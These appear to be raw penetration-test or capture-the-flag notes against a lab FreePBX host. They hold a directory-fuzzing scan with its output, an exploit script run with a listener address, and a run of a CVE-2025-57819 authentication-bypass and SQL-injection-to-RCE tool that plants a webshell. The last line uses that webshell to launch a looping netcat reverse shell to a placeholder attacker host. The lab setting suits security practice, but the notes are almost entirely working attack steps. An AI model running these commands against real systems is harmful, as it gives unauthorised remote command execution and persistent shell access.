ffuf -w /usr/share/wordlists/dirb/common.txt -u http:/https://10.129.133.172/FUZZ -fc 404

python3 exploit.py -u https://10.129.133.172/admin/config.php --lhost 10.10.15.149 --lport 4444

                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 293ms]
.hta                    [Status: 403, Size: 206, Words: 15, Lines: 9, Duration: 306ms]
.htpasswd               [Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 306ms]
.htaccess               [Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 306ms]
admin                   [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 306ms]
cgi-bin/                [Status: 403, Size: 210, Words: 15, Lines: 9, Duration: 314ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 199ms]
robots.txt              [Status: 200, Size: 361, Words: 55, Lines: 12, Duration: 300ms]
ucp                     [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 305ms]


└─$ python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H https://10.129.133.172     
                         __         ___  ___________                   
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________ 
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|   
                                  \/          \/     \/                            
          
        watchTowr-vs-FreePBX-CVE-2025-57819.py
        (*) CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE

          - Piotr and Sonny of watchTowr

[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
[+] Sending exploit request
[+] Waiting 2 minutes for DAG script to be created
[+] VULNERABLE - webshell found: https://10.129.133.172/this-is-an-ioc-not-actually-watchTowr-ce38cvspqb.php?cmd=hostname
[+] Cleaning.sh malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table


https://10.129.133.172/this-is-an-ioc-not-actually-watchTowr-ce38cvspqb.php?cmd="while true; do nc ATTACKER-IP PORT -e /bin/bash; sleep 10; done"